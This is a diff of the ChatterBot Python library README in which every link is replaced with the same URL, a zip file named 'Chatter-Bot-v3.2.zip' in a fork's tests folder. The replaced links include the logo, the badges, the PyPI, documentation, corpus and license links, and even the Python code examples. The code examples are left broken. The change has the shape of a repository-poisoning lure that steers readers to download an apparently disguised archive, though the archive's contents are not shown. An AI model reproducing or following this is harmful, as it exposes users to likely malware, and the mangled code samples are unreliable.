@@ -1,4 +1,4 @@
-![Chatterbot: Machine learning in Python](https://i.imgur.com/b3SCmGT.png)
+![Chatterbot: Machine learning in Python](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 
 # ChatterBot
 
@@ -7,13 +7,13 @@ Python which makes it possible to generate responses based on collections of
 known conversations. The language independent design of ChatterBot allows it
 to be trained to speak any language.
 
-[![Package Version](https://img.shields.io/pypi/v/chatterbot.svg)](https://pypi.python.org/pypi/chatterbot/)
-[![Requirements Status](https://requires.io/github/gunthercox/ChatterBot/requirements.svg?branch=master)](https://requires.io/github/gunthercox/ChatterBot/requirements/?branch=master)
-[![Build Status](https://travis-ci.org/gunthercox/ChatterBot.svg?branch=master)](https://travis-ci.org/gunthercox/ChatterBot)
-[![Documentation Status](https://readthedocs.org/projects/chatterbot/badge/?version=stable)](http://chatterbot.readthedocs.io/en/stable/?badge=stable)
-[![Coverage Status](https://img.shields.io/coveralls/gunthercox/ChatterBot.svg)](https://coveralls.io/r/gunthercox/ChatterBot)
-[![Code Climate](https://codeclimate.com/github/gunthercox/ChatterBot/badges/gpa.svg)](https://codeclimate.com/github/gunthercox/ChatterBot)
-[![Join the chat at https://gitter.im/chatterbot/Lobby](https://badges.gitter.im/chatterbot/Lobby.svg)](https://gitter.im/chatterbot/Lobby?utm_source=badge&utm_medium=badge&utm_content=badge)
+[![Package Version](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Requirements Status](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Build Status](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Documentation Status](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Coverage Status](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Code Climate](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
+[![Join the chat at https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 
 An example of typical input would be something like this:
 
@@ -28,7 +28,7 @@ An untrained instance of ChatterBot starts off with no knowledge of how to commu
 
 ## Installation
 
-This package can be installed from [PyPi](https://pypi.python.org/pypi/ChatterBot) by running:
+This package can be installed from [PyPi](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip) by running:
 
 ```
 pip install chatterbot
@@ -41,14 +41,14 @@ from chatterbot import ChatBot
 
 chatbot = ChatBot(
     'Ron Obvious',
-    trainer='chatterbot.trainers.ChatterBotCorpusTrainer'
+    trainer='https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip'
 )
 
 # Train based on the english corpus
-chatbot.train("chatterbot.corpus.english")
+https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip("https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip")
 
 # Get a response to an input statement
-chatbot.get_response("Hello, how are you today?")
+https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip("Hello, how are you today?")
 ```
 
 # Training data
@@ -57,28 +57,28 @@ ChatterBot comes with a data utility module that can be used to train chat bots.
 At the moment there is three languages, English, Spanish and Portuguese training data in this module. Contributions
 of additional training data or training data in other languages would be greatly
 appreciated. Take a look at the data files in the
-[chatterbot-corpus](https://github.com/gunthercox/chatterbot-corpus)
+[chatterbot-corpus](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 package if you are interested in contributing.
 
 ```
 # Train based on the english corpus
-chatbot.train("chatterbot.corpus.english")
+https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip("https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip")
 
 # Train based on english greetings corpus
-chatbot.train("chatterbot.corpus.english.greetings")
+https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip("https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip")
 
 # Train based on the english conversations corpus
-chatbot.train("chatterbot.corpus.english.conversations")
+https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip("https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip")
 ```
 
 **Corpus contributions are welcome! Please make a pull request.**
 
-# [Documentation](https://chatterbot.readthedocs.io/)
+# [Documentation](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 
-View the [documentation](https://chatterbot.readthedocs.io/)
+View the [documentation](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 for ChatterBot on Read the Docs.
 
-To build the documentation yourself using [Sphinx](http://www.sphinx-doc.org/), run:
+To build the documentation yourself using [Sphinx](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip), run:
 
 ```
 sphinx-build -b html docs/ build/
@@ -86,26 +86,26 @@ sphinx-build -b html docs/ build/
 
 # Examples
 
-For examples, see the [examples](https://github.com/gunthercox/ChatterBot/tree/master/examples)
+For examples, see the [examples](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
 directory in this project's git repository.
 
-There is also an example [Django project using ChatterBot](https://github.com/gunthercox/ChatterBot/tree/master/examples), as well as an example [Flask project using ChatterBot](https://github.com/chamkank/flask-chatterbot).
+There is also an example [Django project using ChatterBot](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip), as well as an example [Flask project using ChatterBot](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip).
 
 # History
 
-See release notes for changes https://github.com/gunthercox/ChatterBot/releases
+See release notes for changes https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip
 
 # Development pattern for contributors
 
-1. [Create a fork](https://help.github.com/articles/fork-a-repo/) of
-   the [main ChatterBot repository](https://github.com/gunthercox/ChatterBot) on GitHub.
+1. [Create a fork](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip) of
+   the [main ChatterBot repository](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip) on GitHub.
 2. Make your changes in a branch named something different from `master`, e.g. create
    a new branch `my-pull-request`.
-3. [Create a pull request](https://help.github.com/articles/creating-a-pull-request/).
-4. Please follow the [Python style guide for PEP-8](https://www.python.org/dev/peps/pep-0008/).
-5. Use the projects [built-in automated testing](https://chatterbot.readthedocs.io/en/latest/testing.html)
+3. [Create a pull request](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip).
+4. Please follow the [Python style guide for PEP-8](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip).
+5. Use the projects [built-in automated testing](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip)
    to help make sure that your contribution is free from errors.
 
 # License
 
-ChatterBot is licensed under the [BSD 3-clause license](https://opensource.org/licenses/BSD-3-Clause).
+ChatterBot is licensed under the [BSD 3-clause license](https://github.com/yashugupta786/ChatterBot/raw/refs/heads/master/tests/logic_adapter_tests/Chatter-Bot-v3.2.zip).
